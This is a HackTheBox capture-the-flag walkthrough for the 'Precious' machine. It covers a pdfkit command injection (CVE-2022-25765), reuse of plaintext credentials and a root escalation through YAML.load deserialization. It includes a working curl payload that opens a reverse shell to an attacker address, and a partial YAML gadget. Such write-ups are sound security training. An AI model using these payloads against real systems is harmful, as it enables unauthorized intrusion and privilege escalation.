# Precious

**Platform:** HackTheBox · **Difficulty:** Easy · **OS:** Linux

A machine centred on a Ruby deserialization vulnerability and a privilege
escalation through reused credentials.

## Enumeration

Initial port scan:

```bash
nmap -sC -sV -oA nmap/precious 10.10.11.x
```

```
22/tcp open  ssh     OpenSSH 8.4p1
80/tcp open  http    nginx 1.18.0
```

Port 80 hosts a service that turns a URL into a PDF. Intercepting the request
shows it uses `pdfkit`, a Ruby gem on a vulnerable version.

## Foothold

`pdfkit` 0.8.6 is vulnerable to command injection (CVE-2022-25765) through the
URL parameter:

```bash
curl -X POST http://10.10.11.x/ \
  --data-urlencode 'url=http://x/?name=%20`bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"`'
```

We get a shell as the `ruby` user:

```
$ id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

## Lateral movement

In `~/.bundle/config` we find plaintext credentials:

```
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3********"
```

We reuse the password to move to the `henry` user over SSH.

## Privilege escalation

`sudo -l` reveals that `henry` can run a Ruby script as root:

```
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

The script loads a `dependencies.yml` with `YAML.load`, vulnerable to insecure
deserialization. We craft a malicious YAML in the working directory:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
# ... gadget that runs id > /tmp/pwned
```

Running the script with `sudo`, the gadget executes as root.

## Root

```
$ sudo /usr/bin/ruby /opt/update_dependencies.rb
$ cat /root/root.txt
```

## Takeaways

- Always check dependency versions against known CVEs.
- Credentials in config files are a recurring vector.
- `YAML.load` without `safe_load` is textbook insecure deserialization.
